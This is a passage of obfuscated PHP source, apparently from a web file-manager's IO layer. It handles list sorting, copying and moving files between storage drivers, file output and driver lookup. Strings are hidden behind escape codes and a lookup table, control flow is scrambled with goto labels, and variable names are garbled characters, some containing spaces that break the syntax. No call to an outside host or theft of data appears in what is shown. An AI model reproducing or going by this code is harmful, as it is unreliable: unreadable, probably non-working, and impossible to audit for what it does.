listData($c·¯‚ôù°Š = false, $a§ÈÚë­›Ú = "\x73\x6f\162\164", $E¸©‘ßÌÓ– = false) { return parent::listData($c·¯‚ôù°Š, $a§ÈÚë­›Ú, $E¸©‘ßÌÓ–); } public function remove($d˜‡Æ­…®ˆ) { return parent::remove($d˜‡Æ­…®ˆ); } public function add($Aç±ˆÒßòƒ, $AˆÛŞÁœ´¬ = "\154\x61\142\x65\154\55\147\162\x65\x79\55\156\x6f\x72\155\141\154") { $AšÑ½“—ç‡ =& $_SERVER[Õİõş]; if ($this->findByName($Aç±ˆÒßòƒ)) { return !1; } $cğ«ñÉÇ¼¤ = array($AšÑ½“—ç‡[382] => $Aç±ˆÒßòƒ, $AšÑ½“—ç‡[432] => $AˆÛŞÁœ´¬, $AšÑ½“—ç‡[2084] => $this->getSort($AšÑ½“—ç‡[242]) + 1); return parent::insert($cğ«ñÉÇ¼¤); } public function update($cø¢©³Ò‰š, $eß‰óø¾¦) { $EœÂ¨ÕÓ§§ =& $_SERVER[Õİõş]; $DÜÇ¯ÃÜ£ = $this->listData($cø¢©³Ò‰š); $d„¤Ë¸óé¨ = $this->findByName($eß‰óø¾¦[$EœÂ¨ÕÓ§§[28]]); if (!$DÜÇ¯ÃÜ£ || $d„¤Ë¸óé¨ && $d„¤Ë¸óé¨[$EœÂ¨ÕÓ§§[363]] != $DÜÇ¯ÃÜ£[$EœÂ¨ÕÓ§§[363]]) { return !1; } return parent::update($cø¢©³Ò‰š, $eß‰óø¾¦); } public function moveTop($FÃ”Ü‰°™Ù) { $CÊ“ÃÍÊÕÏ =& $_SERVER[Õİõş]; $cÖŠ°¼¨§Ã = parent::listData(); $dª‰ŒšÔŞ = $this->getSort($CÊ“ÃÍÊÕÏ[241]); foreach ($cÖŠ°¼¨§Ã as &$E¯½Œæ³¬Ô) { if ($E¯½Œæ³¬Ô[$CÊ“ÃÍÊÕÏ[363]] == $FÃ”Ü‰°™Ù) { $E¯½Œæ³¬Ô[$CÊ“ÃÍÊÕÏ[2101]] = $dª‰ŒšÔŞ; continue; } $E¯½Œæ³¬Ô[$CÊ“ÃÍÊÕÏ[2101]] += 1; } return parent::resetData($cÖŠ°¼¨§Ã); } public function moveBottom($EË¶Ô®ÎÕé) { $FùĞööî¢Ë =& $_SERVER[Õİõş]; $bŠİÀ¯Â“ = $this->getSort($FùĞööî¢Ë[242]) + 1; return parent::update($EË¶Ô®ÎÕé, array($FùĞööî¢Ë[2101] => $bŠİÀ¯Â“)); } public function resetSort($Cà§—Ääéö) { goto côŒ‚‘óß; côŒ‚‘óß: $D©ÒÅøÕ´‹ =& $_SERVER[Õİõş]; $B°å¾ÕĞĞß = array(); $Cà§—Ääéö = is_array($Cà§—Ääéö) ? $Cà§—Ääéö : array(); goto F›²“‘Ï…; F›²“‘Ï…: for ($B¯×‘³÷‚À = 0; $B¯×‘³÷‚À < count($Cà§—Ääéö); $B¯×‘³÷‚À++) { $B°å¾ÕĞĞß[$Cà§—Ääéö[$B¯×‘³÷‚À] . $D©ÒÅøÕ´‹[33]] = $B¯×‘³÷‚À + 1; } $F‹åğØóØë = parent::listData(); foreach ($F‹åğØóØë as &$FöÖ™¶áø) { $E©ÁÌÆ¡æ¯ = $B°å¾ÕĞĞß[$FöÖ™¶áø[$D©ÒÅøÕ´‹[363]]]; $FöÖ™¶áø[$D©ÒÅøÕ´‹[2101]] = $E©ÁÌÆ¡æ¯ ? $E©ÁÌÆ¡æ¯ : $FöÖ™¶áø[$D©ÒÅøÕ´‹[2101]]; } goto Báæ»˜©Ö; Báæ»˜©Ö: return parent::resetData($F‹åğØóØë); goto dˆğ“„¡ÎÌ; dˆğ“„¡ÎÌ: } private function getSort($eƒµÑ“•¬«) { $dÂß‡²î³Å =& $_SERVER[Õİõş]; $e©¢“Èª—£ = parent::listData(); $D¯­¼ÁÌÃµ = array_to_keyvalue($e©¢“Èª—£, $dÂß‡²î³Å[33], $dÂß‡²î³Å[2101]); if (!$D¯­¼ÁÌÃµ) { $D¯­¼ÁÌÃµ = array(0); } $F»˜½ÛŠ¾ = $eƒµÑ“•¬« == $dÂß‡²î³Å[242] ? max($D¯­¼ÁÌÃµ) : min($D¯­¼ÁÌÃµ); return intval($F»˜½ÛŠ¾); } } goto f£ù«¿°§´; D„ƒÔğˆŒ†: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($F­³®Ù˜±Ê, $aÌÑó£ç ³) { $CÓŒÏíˆ¢æ = self::driverMake($aÌÑó£ç ³[0]); if (method_exists($CÓŒÏíˆ¢æ, $F­³®Ù˜±Ê)) { return @call_user_func_array(array($CÓŒÏíˆ¢æ, $F­³®Ù˜±Ê), $aÌÑó£ç ³); } if (method_exists($CÓŒÏíˆ¢æ, $_SERVER[Õİõş][999])) { return @call_user_func_array(array($CÓŒÏíˆ¢æ, $F­³®Ù˜±Ê), $aÌÑó£ç ³); } else { if (method_exists(self, $F­³®Ù˜±Ê)) { return @call_user_func_array(array(self, $F­³®Ù˜±Ê), $aÌÑó£ç ³); } else { call_user_func_array(array(parent, $F­³®Ù˜±Ê), $aÌÑó£ç ³); } } } public static function init($aÔÄ¡“ë §) { return self::driverMake($aÔÄ¡“ë §); } public static function copy($bÜÂÛ¶¢×†, $dõ£àè–‡¡, $e†ì‘·Ñ† = false, $D……İ³Â–¨ = false) { return self::copyMove($bÜÂÛ¶¢×†, $dõ£àè–‡¡, $e†ì‘·Ñ†, $_SERVER[Õİõş][485], $D……İ³Â–¨); } public static function move($b­ô–ŠºÜ, $DøÄ­¿–, $f³ƒóÃ«è = false, $f­ÄŠéÃö× = false) { return self::copyMove($b­ô–ŠºÜ, $DøÄ­¿–, $f³ƒóÃ«è, $_SERVER[Õİõş][487], $f­ÄŠéÃö×); } public static function saveFile($aÍî…´ÚàÎ, $eØ¾ë‡Ã´ä, $Aé¯¨ƒÇÕØ = true) { goto AîØª¥˜Á”; AîØª¥˜Á”: $bÛœ»«Ù‰ =& $_SERVER[Õİõş]; $c¢Åæê«­‚ = self::info($eØ¾ë‡Ã´ä); $Dğ«³´ºíÜ = self::driverMake($aÍî…´ÚàÎ); goto bå·÷Ü¹í; E§Ú¦Èí‹: $F–ˆêÍ—ŠÙ = self::copyFile($Dğ«³´ºíÜ, $aÍî…´ÚàÎ, $DòëÁ‹’Ğ, $EÖˆ¢ò†Ûä, $c¢Åæê«­‚[$bÛœ»«Ù‰[28]], $Bˆ¢øÜ–ñ); if ($cÈ±ŒŸŸ¦â) { $F–ˆêÍ—ŠÙ = $cÈ±ŒŸŸ¦â->getPathOuter($F–ˆêÍ—ŠÙ); } return $F–ˆêÍ—ŠÙ; goto F¦òº†Åªå; bå·÷Ü¹í: $DòëÁ‹’Ğ = self::driverMake($eØ¾ë‡Ã´ä); $cÈ±ŒŸŸ¦â = !1; if ($DòëÁ‹’Ğ->pathParse[$bÛœ»«Ù‰[1000]]) { $dµÂØÑéà³ = $DòëÁ‹’Ğ->pathParse[$bÛœ»«Ù‰[1000]]; $cÈ±ŒŸŸ¦â = $DòëÁ‹’Ğ; $DòëÁ‹’Ğ = self::driverMake($dµÂØÑéà³); } goto BàƒŞææëÅ; BàƒŞææëÅ: $EÖˆ¢ò†Ûä = $DòëÁ‹’Ğ->pathFather($eØ¾ë‡Ã´ä); $Bˆ¢øÜ–ñ = !0; if (!$Aé¯¨ƒÇÕØ && self::driverIsSame($Dğ«³´ºíÜ, $DòëÁ‹’Ğ)) { $Bˆ¢øÜ–ñ = !1; } goto E§Ú¦Èí‹; F¦òº†Åªå: } private static function copyMove($F°Ö©‘ëÅ, $aÍœô—ñ‘, $F½³é¦©, $C®É¡Ò¢, $eï±ùÍä¿˜ = false) { goto dÒÉ„ÌŸğİ; A©¨ùÁ÷»: $B™È„ÔËèè = $Cå‰Ïà„³õ->isFile($F°Ö©‘ëÅ); if (!$B™È„ÔËèè && $E“¦‚»Û“—->getType() == $DœŞù¡æÉ×[696] && $Cå‰Ïà„³õ->getType() == $DœŞù¡æÉ×[101]) { $F­ˆ‘¹”—Ï = $E“¦‚»Û“—->copyFolderFromIO($Cå‰Ïà„³õ, $F°Ö©‘ëÅ, $aÍœô—ñ‘, $F½³é¦©, $Eê‹‰šÉ, $eï±ùÍä¿˜); } else { $F­ˆ‘¹”—Ï = self::copyPath($Cå‰Ïà„³õ, $F°Ö©‘ëÅ, $E“¦‚»Û“—, $aÍœô—ñ‘, $F½³é¦©, $Eê‹‰šÉ, $B™È„ÔËèè, $eï±ùÍä¿˜); } if ($F­ˆ‘¹”—Ï && $Eê‹‰šÉ) { $Cå‰Ïà„³õ->remove($F°Ö©‘ëÅ); } goto BÕëŒ†°è; CˆÚ’„»ÆÆ: $a¹¶´¬â´ = !1; if ($E“¦‚»Û“—->pathParse[$DœŞù¡æÉ×[1000]]) { $aÍœô—ñ‘ = $E“¦‚»Û“—->pathParse[$DœŞù¡æÉ×[1000]]; $a¹¶´¬â´ = $E“¦‚»Û“—; $E“¦‚»Û“— = self::driverMake($aÍœô—ñ‘); } self::check($Cå‰Ïà„³õ, $F°Ö©‘ëÅ, $E“¦‚»Û“—, $aÍœô—ñ‘); goto d¤Æ„õ‘óë; DÀ˜¡ÁÊØ: $Cå‰Ïà„³õ = self::driverMake($F°Ö©‘ëÅ); $E“¦‚»Û“— = self::driverMake($aÍœô—ñ‘); $Eê‹‰šÉ = $C®É¡Ò¢ == $DœŞù¡æÉ×[487]; goto CˆÚ’„»ÆÆ; BÕëŒ†°è: if ($a¹¶´¬â´) { $F­ˆ‘¹”—Ï = $a¹¶´¬â´->getPathOuter($F­ˆ‘¹”—Ï); } return $F­ˆ‘¹”—Ï; goto eáàñ£èïß; dÒÉ„ÌŸğİ: $DœŞù¡æÉ× =& $_SERVER[Õİõş]; if (!$F°Ö©‘ëÅ || $F°Ö©‘ëÅ == $DœŞù¡æÉ×[8] || !$aÍœô—ñ‘) { return !1; } ignore_timeout(); goto DÀ˜¡ÁÊØ; d¤Æ„õ‘óë: Hook::trigger($DœŞù¡æÉ×[72], $Cå‰Ïà„³õ, $F°Ö©‘ëÅ, $E“¦‚»Û“—, $aÍœô—ñ‘); $BÀÚ²İÂÖ = self::driverIsSame($Cå‰Ïà„³õ, $E“¦‚»Û“—); if ($BÀÚ²İÂÖ) { if ($C®É¡Ò¢ == $DœŞù¡æÉ×[487] && trim($aÍœô—ñ‘, $DœŞù¡æÉ×[8]) == trim($E“¦‚»Û“—->pathFather($F°Ö©‘ëÅ), $DœŞù¡æÉ×[8])) { return $E“¦‚»Û“—->getPathOuter($F°Ö©‘ëÅ); } if (method_exists($E“¦‚»Û“—, $C®É¡Ò¢)) { return $E“¦‚»Û“—->{$C®É¡Ò¢}($F°Ö©‘ëÅ, $aÍœô—ñ‘, $F½³é¦©); } } goto A©¨ùÁ÷»; eáàñ£èïß: } private static function check($FÃ…ø¬ØçÒ, $aÔÄÊ•Şî, $F×Êóè¿Œä, &$B«‘¯ß ‰) { $A¸Æ¿ãšœÈ =& $_SERVER[Õİõş]; if (self::driverIsSame($FÃ…ø¬ØçÒ, $F×Êóè¿Œä) && $FÃ…ø¬ØçÒ->isFolder($aÔÄÊ•Şî) && $FÃ…ø¬ØçÒ->isParentOf($aÔÄÊ•Şî, $B«‘¯ß ‰)) { show_json(LNG($A¸Æ¿ãšœÈ[1001]), !1); } if (!$FÃ…ø¬ØçÒ->exist($aÔÄÊ•Şî)) { show_json(LNG($A¸Æ¿ãšœÈ[100]), !1); } } private static function copyPath($FÕ—ƒ•»®, $EˆË©Ğ—Ç, $aÓƒŞÏšùœ, $CºÑĞâôÏ, $bíº·½“®í, $Eš¥”õ°ğ, $f‹Äëç§ª , $BŒÀÆ³ÎŠË = false) { goto D›Ôëãœä; c®Œ‰çàÚ§: if ($f‹Äëç§ª ) { return self::copyFile($FÕ—ƒ•»®, $EˆË©Ğ—Ç, $aÓƒŞÏšùœ, $CºÑĞâôÏ, $b™ —ÒºÌÎ, $Eš¥”õ°ğ); } if ($bíº·½“®í == REPEAT_RENAME_FOLDER) { $bíº·½“®í = !1; } $D¶¢ŠÄÃåº = rtrim($CºÑĞâôÏ, $d°‘šÊö[8]) . $d°‘šÊö[8] . $b™ —ÒºÌÎ; goto b‹°ÏÍ¾Ó¨; f×ĞÆ„ËÆ: $D»·¿øŠØÊ = array_merge($Cê…¼‚Ÿ‡[$d°‘šÊö[73]], $Cê…¼‚Ÿ‡[$d°‘šÊö[74]]); foreach ($D»·¿øŠØÊ as $c¦Üß³¯ë) { $cĞÏ‡àííÚ = $c¦Üß³¯ë[$d°‘šÊö[29]] == $d°‘šÊö[163]; $EˆË©Ğ—Ç = $FÕ—ƒ•»®->getPathInner($c¦Üß³¯ë[$d°‘šÊö[75]]); $E’ª²·‰‹ = self::copyPath($FÕ—ƒ•»®, $EˆË©Ğ—Ç, $aÓƒŞÏšùœ, $CºÑĞâôÏ, $bíº·½“®í, $Eš¥”õ°ğ, $cĞÏ‡àííÚ); if (!$E’ª²·‰‹) { write_log($d°‘šÊö[1002] . $EˆË©Ğ—Ç . $d°‘šÊö[1003] . $CºÑĞâôÏ, $d°‘šÊö[1004]); } } return $BÕœß¬Ë•ó; goto F¥Ù”“…ì§; D›Ôëãœä: $d°‘šÊö =& $_SERVER[Õİõş]; $b™ —ÒºÌÎ = $BŒÀÆ³ÎŠË ? $BŒÀÆ³ÎŠË : $FÕ—ƒ•»®->getPathName($FÕ—ƒ•»®->pathThis($EˆË©Ğ—Ç)); if ($bíº·½“®í) { $EŠÅåíŠê¹ = $aÓƒŞÏšùœ->fileNameExist($CºÑĞâôÏ, $b™ —ÒºÌÎ); $b™ —ÒºÌÎ = $aÓƒŞÏšùœ->fileNameAuto($CºÑĞâôÏ, $b™ —ÒºÌÎ, $bíº·½“®í, !$f‹Äëç§ª ); $bíº·½“®í = $EŠÅåíŠê¹ ? $bíº·½“®í : !1; } goto c®Œ‰çàÚ§; b‹°ÏÍ¾Ó¨: $BÕœß¬Ë•ó = $aÓƒŞÏšùœ->mkdir($aÓƒŞÏšùœ->getPath($D¶¢ŠÄÃåº)); $CºÑĞâôÏ = $aÓƒŞÏšùœ->getPathInner($BÕœß¬Ë•ó); $Cê…¼‚Ÿ‡ = $FÕ—ƒ•»®->listPath($EˆË©Ğ—Ç, !0); goto f×ĞÆ„ËÆ; F¥Ù”“…ì§: } private static function copyFile($dÊ™§»ñöÉ, $e”ã¤ÉŸ§, $A‹ÎÉÜê‡, $E›¤¸‚ªà, $f‹è¨÷î‡×, $Dñî—ÔŠø) { goto A»ï† ÷Û¾; CÜ¹·ºÓä: Hook::trigger($D¢›ëóÛË•[1007], $dÊ™§»ñöÉ, $e”ã¤ÉŸ§, $A‹ÎÉÜê‡, $E›¤¸‚ªà, $f‹è¨÷î‡×, $aØ¤‚ºß­); return $aØ¤‚ºß­; goto EêŞÀ ´”; fƒÍªªŞÉ˜: mk_dir($C‚öšõ¹©Ø); $f ‘ÌÏ¿½µ = $C‚öšõ¹©Ø . $E¼Ïù‚À¨ˆ; $f ‘ÌÏ¿½µ = $dÊ™§»ñöÉ->download($e”ã¤ÉŸ§, $f ‘ÌÏ¿½µ); goto Bóäˆ‰À‚Û; A»ï† ÷Û¾: $D¢›ëóÛË• =& $_SERVER[Õİõş]; $E›¤¸‚ªà = $A‹ÎÉÜê‡->getPath(rtrim($E›¤¸‚ªà, $D¢›ëóÛË•[8]) . $D¢›ëóÛË•[8] . $f‹è¨÷î‡×); $E¼Ïù‚À¨ˆ = $D¢›ëóÛË•[1005] . time() . rand_string(5); goto eİßÆØÆ‹Û; eİßÆØÆ‹Û: Hook::trigger($D¢›ëóÛË•[1006], $dÊ™§»ñöÉ, $e”ã¤ÉŸ§, $A‹ÎÉÜê‡, $E›¤¸‚ªà, $f‹è¨÷î‡×, $E¼Ïù‚À¨ˆ); if (self::driverIsSame($dÊ™§»ñöÉ, $A‹ÎÉÜê‡)) { if ($Dñî—ÔŠø) { $aØ¤‚ºß­ = $A‹ÎÉÜê‡->moveFile($e”ã¤ÉŸ§, $E›¤¸‚ªà); } else { $aØ¤‚ºß­ = $A‹ÎÉÜê‡->copyFile($e”ã¤ÉŸ§, $E›¤¸‚ªà); } Hook::trigger($D¢›ëóÛË•[1007], $dÊ™§»ñöÉ, $e”ã¤ÉŸ§, $A‹ÎÉÜê‡, $E›¤¸‚ªà, $f‹è¨÷î‡×, $aØ¤‚ºß­); return $aØ¤‚ºß­; } $C‚öšõ¹©Ø = TEMP_FILES; goto fƒÍªªŞÉ˜; Bóäˆ‰À‚Û: $f ‘ÌÏ¿½µ = $dÊ™§»ñöÉ->iconvApp($f ‘ÌÏ¿½µ); $aØ¤‚ºß­ = $A‹ÎÉÜê‡->upload($E›¤¸‚ªà, $f ‘ÌÏ¿½µ, $Dñî—ÔŠø); self::remove($C‚öšõ¹©Ø . $E¼Ïù‚À¨ˆ); goto CÜ¹·ºÓä; EêŞÀ ´”: } public static function pathFather($dğØ÷˜±ï) { $AÚÂ™»¨¼Ÿ = IO::init($dğØ÷˜±ï); $F‚÷ì¤‚—ä = $AÚÂ™»¨¼Ÿ->pathFather($AÚÂ™»¨¼Ÿ->path); return $AÚÂ™»¨¼Ÿ->getPathOuter($F‚÷ì¤‚—ä); } public static function fileOut($bÍÄö»ƒ´, $e¢ŠˆëÉ—È = false, $Bº›¢ŠŠ = false, $få«† = '') { $dà­áñø… = self::driverMake($bÍÄö»ƒ´); if ($dà­áñø…->isFileOutServer()) { return $dà­áñø…->fileOutServer($bÍÄö»ƒ´, $e¢ŠˆëÉ—È, $Bº›¢ŠŠ, $få«†); } return $dà­áñø…->fileOut($bÍÄö»ƒ´, $e¢ŠˆëÉ—È, $Bº›¢ŠŠ, $få«†); } public static function fileOutImage($f°óöäÆ¢Ç, $fÑ°ˆÚƒÓø = 250) { $D¾øƒ¸˜Ì = array(250, 600, 1200, 3000); for ($BáàÛ¨âĞô = 0; $BáàÛ¨âĞô < count($D¾øƒ¸˜Ì); $BáàÛ¨âĞô++) { if ($BáàÛ¨âĞô == 0 && $fÑ°ˆÚƒÓø <= $D¾øƒ¸˜Ì[$BáàÛ¨âĞô]) { $fÑ°ˆÚƒÓø = $D¾øƒ¸˜Ì[$BáàÛ¨âĞô]; break; } else { if ($fÑ°ˆÚƒÓø > $D¾øƒ¸˜Ì[$BáàÛ¨âĞô - 1] && $fÑ°ˆÚƒÓø <= $D¾øƒ¸˜Ì[$BáàÛ¨âĞô]) { $fÑ°ˆÚƒÓø = $D¾øƒ¸˜Ì[$BáàÛ¨âĞô]; break; } else { if ($BáàÛ¨âĞô == count($D¾øƒ¸˜Ì) - 1 && $fÑ°ˆÚƒÓø > $D¾øƒ¸˜Ì[$BáàÛ¨âĞô]) { $fÑ°ˆÚƒÓø = $D¾øƒ¸˜Ì[$BáàÛ¨âĞô]; break; } } } } $aÖ«‡•æ®Í = self::driverMake($f°óöäÆ¢Ç); if ($aÖ«‡•æ®Í->isFileOutServer()) { return $aÖ«‡•æ®Í->fileOutImageServer($f°óöäÆ¢Ç, $fÑ°ˆÚƒÓø); } return $aÖ«‡•æ®Í->fileOutImage($f°óöäÆ¢Ç, $fÑ°ˆÚƒÓø); } private static function driverIsSame($fˆØâáÍÌ·, $Aíªƒæ±®©) { goto CÍòé•‚Êí; CÍòé•‚Êí: $f£Èì¨­æò =& $_SERVER[Õİõş]; $Dó¬ß‹‹Î = $fˆØâáÍÌ·->getType(); $d¿ÛŸò¸ÇŞ = $Aíªƒæ±®©->getType(); goto a¹‹èŠŒ¡; a¹‹èŠŒ¡: if ($Dó¬ß‹‹Î != $d¿ÛŸò¸ÇŞ) { return !1; } if ($Dó¬ß‹‹Î == $f£Èì¨­æò[696]) { return !0; } if ($Dó¬ß‹‹Î == $f£Èì¨­æò[101]) { return !0; } goto B¤ÕÃŸ½ïŠ; B¤ÕÃŸ½ïŠ: if ($fˆØâáÍÌ·->pathDriver == $Aíªƒæ±®©->pathDriver) { return !0; } return !1; goto c›¨éÚ¤§; c›¨éÚ¤§: } public static function copyUpdate($A›¤ÂÌÌª, $f¾µ Å•Ÿ) { goto CñÁ½Ğ‹”Ş; CñÁ½Ğ‹”Ş: $C²Ëôèå­¢ =& $_SERVER[Õİõş]; if (!IO::exist($A›¤ÂÌÌª)) { return !1; } if (!IO::exist($f¾µ Å•Ÿ)) { IO::mkdir($f¾µ Å•Ÿ); } goto dõİ¶¡²‡; aÄ¨Ş¹¨ê½: $d…•æâÕØ„ = array(); foreach ($dß‘Î»µ… as $E‚ ÊŠ”£— => $e‹ ›•‡¾) { if (isset($bÆ°àÈ»Í[$E‚ ÊŠ”£—])) { if ($e‹ ›•‡¾[$C²Ëôèå­¢[76]] == 1) { continue; } if ($bÆ°àÈ»Í[$E‚ ÊŠ”£—][$C²Ëôèå­¢[77]] == $e‹ ›•‡¾[$C²Ëôèå­¢[77]]) { continue; } } if ($e‹ ›•‡¾[$C²Ëôèå­¢[76]] == 1) { $d…•æâÕØ„[] = $f¾µ Å•Ÿ . $C²Ëôèå­¢[8] . $E‚ ÊŠ”£—; continue; } $F–øôíã…ñ = strstr(trim($E‚ ÊŠ”£—, $C²Ëôèå­¢[8]), $C²Ëôèå­¢[8]) ? get_path_father($E‚ ÊŠ”£—) : $C²Ëôèå­¢[33]; $EµåÔ¸Áôø[] = array($C²Ëôèå­¢[1008] => $e‹ ›•‡¾[$C²Ëôèå­¢[75]], $C²Ëôèå­¢[1009] => rtrim($f¾µ Å•Ÿ, $C²Ëôèå­¢[8]) . $C²Ëôèå­¢[8] . $F–øôíã…ñ, $C²Ëôèå­¢[1010] => $e‹ ›•‡¾); } $cÊÖÇ¸Ë“½ = array($C²Ëôèå­¢[163] => $EµåÔ¸Áôø, $C²Ëôèå­¢[76] => $d…•æâÕØ„); goto a–Õ™Ïè; dõİ¶¡²‡: $dß‘Î»µ… = self::_listAll($A›¤ÂÌÌª); $bÆ°àÈ»Í = self::_listAll($f¾µ Å•Ÿ); $EµåÔ¸Áôø = array(); goto aÄ¨Ş¹¨ê½; a–Õ™Ïè: Hook::trigger($C²Ëôèå­¢[1011], $A›¤ÂÌÌª, $f¾µ Å•Ÿ, $cÊÖÇ¸Ë“½); foreach ($d…•æâÕØ„ as $e‹ ›•‡¾) { IO::mkdir($e‹ ›•‡¾); } foreach ($EµåÔ¸Áôø as $e‹ ›•‡¾) { IO::copy($e‹ ›•‡¾[$C²Ëôèå­¢[1008]], $e‹ ›•‡¾[$C²Ëôèå­¢[1009]], REPEAT_REPLACE); } goto DÑØ¼ïŸ¨Á; DÑØ¼ïŸ¨Á: } private static function _listAll($a”§¯³†óó) { $FõÁà ªİÏ =& $_SERVER[Õİõş]; $a”§¯³†óó = KodIO::clear($a”§¯³†óó); $bÖÑšáĞğè = IO::listAll($a”§¯³†óó); foreach ($bÖÑšáĞğè as &$f„‚—Š’Ë¹) { $fõ½©»Û—™ = substr($f„‚—Š’Ë¹[$FõÁà ªİÏ[75]], strlen($a”§¯³†óó)); $f„‚—Š’Ë¹[$FõÁà ªİÏ[1012]] = trim($fõ½©»Û—™, $FõÁà ªİÏ[8]); } return array_to_keyvalue($bÖÑšáĞğè, $FõÁà ªİÏ[1012]); } public static function fileSubstr($Bõø»µÚÅ, $eê–ğô­‹, $d”ã¹·‡§’ = false) { goto eŠ‡¸ÇÀèù; eŠ‡¸ÇÀèù: $BŠºí §šâ = self::driverMake($Bõø»µÚÅ); $b†µ÷¡§æ = $BŠºí §šâ->size($Bõø»µÚÅ); $d®¼Š¹õ«¾ = $eê–ğô­‹; goto aŒ¼ãŸ‹©ç; eŠÇ“óø™±: if ($eê–ğô­‹ + $d”ã¹·‡§’ > $b†µ÷¡§æ) { $d”ã¹·‡§’ = $b†µ÷¡§æ - $eê–ğô­‹; } if ($d”ã¹·‡§’ <= 0) { return $_SERVER[Õİõş][33]; } if ($eê–ğô­‹ < 0 || $eê–ğô­‹ >= $b†µ÷¡§æ || $d”ã¹·‡§’ > 1024 * 1024 * 5) { throw new Exception("\146\151\x6c\145\122\x65\x61\144\x20\x65\162\x72\x6f\x72\x21\x20\163\x74\x61\162\x74\75{$eê–ğô­‹}\73\154\145\156\147\x74\x68\75{$d”ã¹·‡§’}\73\x20\x73\x69\x7a\x65\75{$b†µ÷¡§æ}\x3b"); } goto dÄÓ©ƒÖÒÏ; dÄÓ©ƒÖÒÏ: return $BŠºí §šâ->fileSubstr($Bõø»µÚÅ, $eê–ğô­‹, $d”ã¹·‡§’); goto FÇÜ…²æ‡á; aŒ¼ãŸ‹©ç: $fÎ…éèñÈ¢ = $d”ã¹·‡§’; if ($eê–ğô­‹ < 0) { $eê–ğô­‹ = $b†µ÷¡§æ + $eê–ğô­‹; } if ($d”ã¹·‡§’ === !1) { $d”ã¹·‡§’ = $b†µ÷¡§æ - $eê–ğô­‹; } goto eŠÇ“óø™±; FÇÜ…²æ‡á: } private static function driverMake(&$EòÕ¦¿Ø¯‘) { goto E‡”ˆœòå…; E‡”ˆœòå…: $A£†±­Œãï =& $_SERVER[Õİõş]; $d…Á”×Œ´º = KodIO::parse($EòÕ¦¿Ø¯‘); if (!self::$driverListSystem) { $E±¢¦æ³á§ = Model($A£†±­Œãï[706])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($E±¢¦æ³á§, $A£†±­Œãï[363]); } goto Cø´¾ªšªÜ; Cø´¾ªšªÜ: if ($d…Á”×Œ´º[$A£†±­Œãï[29]] == KodIO::KOD_IO && !self::$driverListSystem[$d…Á”×Œ´º[$A£†±­Œãï[363]]]) { return !1; } $EòÕ¦¿Ø¯‘ = $d…Á”×Œ´º[$A£†±­Œãï[1013]]; $C·”‘–çœ‡ = self::driverGet($d…Á”×Œ´º, $EòÕ¦¿Ø¯‘); goto A†‹İÙ“œ·; A†‹İÙ“œ·: return $C·”‘–çœ‡; goto aŒ…‡İÔŞØ; aŒ…‡İÔŞØ: } private static function driverGet($aÌ×âÃÂˆŸ, &$B»ÌºñöõÀ) { goto F¯ ä‡ÙùŞ; a…Û„²×Î²: $B¡¼‡ÌøÔÆ->path = $B»ÌºñöõÀ; return $B¡¼‡ÌøÔÆ; goto F÷£ƒôŞ¶å; F¯ ä‡ÙùŞ: $Eñİñ©Ï¥ =& $_SERVER[Õİõş]; $bî¬•ùãõ = $aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[1014]]; $eÓ»âî‹° = $aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[363]]; goto E¾“é‚Òğ; cß‰¬Îâà„: $B¡¼‡ÌøÔÆ = self::$driverCache[$F¸Óí¦ò½á]; $B¡¼‡ÌøÔÆ->pathDriver = $bî¬•ùãõ; $B¡¼‡ÌøÔÆ->pathBase = $Eñİñ©Ï¥[33]; goto d¿‰ˆŠÅ‘ì; d¿‰ˆŠÅ‘ì: if (isset($F°É¼‰Óƒ[$Eñİñ©Ï¥[6]][$Eñİñ©Ï¥[1026]])) { $B¡¼‡ÌøÔÆ->pathBase = rtrim($F°É¼‰Óƒ[$Eñİñ©Ï¥[6]][$Eñİñ©Ï¥[1026]], $Eñİñ©Ï¥[8]) . $Eñİñ©Ï¥[8]; $B»ÌºñöõÀ = $B¡¼‡ÌøÔÆ->pathBase . ltrim($B»ÌºñöõÀ, $Eñİñ©Ï¥[8]); } $B»ÌºñöõÀ = $B¡¼‡ÌøÔÆ->getPath($B»ÌºñöõÀ); if (isset($aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[1000]])) { $B»ÌºñöõÀ = $aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[1000]]; } goto a…Û„²×Î²; E¾“é‚Òğ: switch ($aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[29]]) { case KodIO::KOD_IO: $F°É¼‰Óƒ = self::$driverListSystem[$eÓ»âî‹°]; break; case KodIO::KOD_SOURCE: $B»ÌºñöõÀ = $eÓ»âî‹° . $B»ÌºñöõÀ; $F°É¼‰Óƒ = array($Eñİñ©Ï¥[1015] => $Eñİñ©Ï¥[1016], $Eñİñ©Ï¥[6] => $aÌ×âÃÂˆŸ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $A™¤»ÀŞÛ = $GLOBALS[$Eñİñ©Ï¥[1017]]; self::$driverListUser = array_to_keyvalue($A™¤»ÀŞÛ, $Eñİñ©Ï¥[363]); } $F°É¼‰Óƒ = self::$driverListUser[$eÓ»âî‹°]; break; case KodIO::KOD_SHARE_LINK: $F°É¼‰Óƒ = array($Eñİñ©Ï¥[1015] => $Eñİñ©Ï¥[1018], $Eñİñ©Ï¥[6] => $aÌ×âÃÂˆŸ); $Cæõ«’¶öù = Action($Eñİñ©Ï¥[1019])->sharePathInfo($aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[75]]); $B»ÌºñöõÀ = $Cæõ«’¶öù[$Eñİñ©Ï¥[365]]; if (!$Cæõ«’¶öù[$Eñİñ©Ï¥[365]]) { $AÄÊ¢ó‚È¦ = Model($Eñİñ©Ï¥[531])->getInfo($Cæõ«’¶öù[$Eñİñ©Ï¥[436]]); $B»ÌºñöõÀ = KodIO::clear($AÄÊ¢ó‚È¦[$Eñİñ©Ï¥[1020]] . $aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[1013]]); $aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[434]] = $AÄÊ¢ó‚È¦; $aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[1000]] = $B»ÌºñöõÀ; $F°É¼‰Óƒ = array($Eñİñ©Ï¥[1015] => $Eñİñ©Ï¥[1021], $Eñİñ©Ï¥[6] => $aÌ×âÃÂˆŸ); } break; case KodIO::KOD_SHARE_ITEM: 